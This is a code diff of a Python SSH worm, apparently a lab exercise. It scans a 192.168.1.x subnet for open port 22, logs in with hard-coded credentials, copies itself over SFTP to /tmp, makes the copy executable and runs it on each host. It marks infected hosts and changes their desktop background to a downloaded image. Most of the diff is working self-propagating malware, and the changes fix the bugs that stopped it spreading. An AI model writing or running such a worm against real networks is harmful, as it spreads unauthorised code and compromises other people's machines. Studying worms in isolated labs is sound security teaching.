@@ -9,8 +9,8 @@ import paramiko
 target_port = 22
 
 # New desktop background url + file name
-image_url = "https://i.imgur.com/hbNtlcJ.jpg"
-image_name = "hbNtlcJ.jpg"
+image_url = "https://i.imgur.com/nXL65Cb.png" 
+image_name = "lolcat.png"
 
 # Username and password to test with SSH
 remote_username = "cpsc"
@@ -26,20 +26,20 @@ offset = 4 * " "
 # Place in remote system to mark it as infected
 marker_file = "infected.txt"
 
-# Specifies what ip to stop at 192.168.1.0-max_ip. Saves time in testing
+# Specifies what ip to stop at. Saves time in testing
 max_ip = 10
-
 
 hosts = ["192.168.1." + str(i) for i in range(0, max_ip)]
 
 
 def get_local_ip():
-	""" Gets current machine's ip, so we don't waste time scanning it """
+	""" Gets current machine's ip """
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	try:
 		sock.connect(('8.8.8.8', 1))
 		local_ip = sock.getsockname()[0]
 	except:
+		# Default value in case a connection couldn't be made
 		local_ip = "127.0.0.1"
 	finally:
 		sock.close()
@@ -48,7 +48,7 @@ def get_local_ip():
 
 
 def scan_port(host, port):
-	""" Scans specified port for a specified host, returns 0 on success """
+	""" Scans [port] on [host], returns 0 on success """
 	exit_code = -1
 	try:
 		# Set up socket to connect to
@@ -63,9 +63,6 @@ def scan_port(host, port):
 	except Exception as e:
 		print ("%s[!] Port %d closed or unavailable\n" % (offset, port))
 		pass
-	except KeyboardInterrupt as e:
-		print ("%s[!] User stopped scanning host %s\n" % (offset, host))
-		return -1
 	finally:
 		ssh_sock.close()
 	return exit_code
@@ -105,7 +102,9 @@ def set_background():
 	if image_name not in ls_output:
 		print ("%s[o] Adding background..." % (offset))
 		os.system("wget " + image_url + " -O " + home_dir + image_name)
-	# Now set the backround	
+		time.sleep(5)
+		os.system("chmod 777 " + home_dir + image_name)
+	# Now set the background	
 	print ("Setting background now...")
 	os.environ["DISPLAY"] = ":0"
 	#os.system("gsettings set org.gnome.desktop.background picture-uri \"file://" + home_dir + image_name+ "\"")
@@ -114,9 +113,7 @@ def set_background():
 
 if __name__ == "__main__":
 	
-	set_background()
 	""" Main program that performs the scan """
-	
 	vulnerable_hosts = get_vulnerable_hosts(target_port)
 	print ("\n[Scan Results]")
 	print ("Vulnerable hosts: %s, \n" % (vulnerable_hosts))
@@ -124,8 +121,8 @@ if __name__ == "__main__":
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 	local_ip = get_local_ip()
-	for host in sorted(vulnerable_hosts):
-		print ("[+] Attempting to SSH into %s" % (host))
+	for host in vulnerable_hosts:
+		print ("[+] Attempting to connect to %s" % (host))
 
 		# Attempt to SSH into known host
 		try:
@@ -158,19 +155,42 @@ if __name__ == "__main__":
 			else: # Has not been infected
 				print ("%s[o] Marking system..." % (offset))
 				sftpClient.put(worm_name, "/tmp/" + worm_name)
+				#sftpClient.put(home_dir + image_name, home_dir + image_name)
 				ssh.exec_command("echo " + local_ip + " >> /tmp/" + marker_file)
 					
 		except Exception as e:
 			print ("%s[!] Error opening sftp connection. Skipping host " % (offset))
 			ssh.close()
+			os.system("touch /home/cpsc/error3.txt")
 			continue
 		# Try making worm file executable by all
 		try:
-			ssh.exec_command("chmod a+x /tmp" + worm_name)
+			ssh.exec_command("chmod a+x /tmp/" + worm_name)
 		except Exception as e: 
 			print ("%s [!]Error with chmod. Skipping host", (offset))
 			ssh.close()
+			os.system("touch /home/cpsc/error2.txt")
 			continue
 		# Try launching the worm from remote host
 		try:
 			ssh.exec_command("python /tmp/" + worm_name)
+			print ("%s[o] Executing worm from %s" % (offset, host))
+			break
+		except Exception as e:
+			print("%s[!] Error executing" % (offset))
+			os.system("touch /home/cpsc/error.txt")
+			ssh.close()
+			#continue
+			break
+
+		except KeyboardInterrupt as e:
+			print ("%s[!] User stopped, quitting.\n" % (offset))
+			ssh.close()
+			sys.exit(1)
+		
+
+		ssh.close()
+	set_background()
+	os.system("touch /home/cpsc/finished.txt")
+	print ("Finished attacking\n")
+
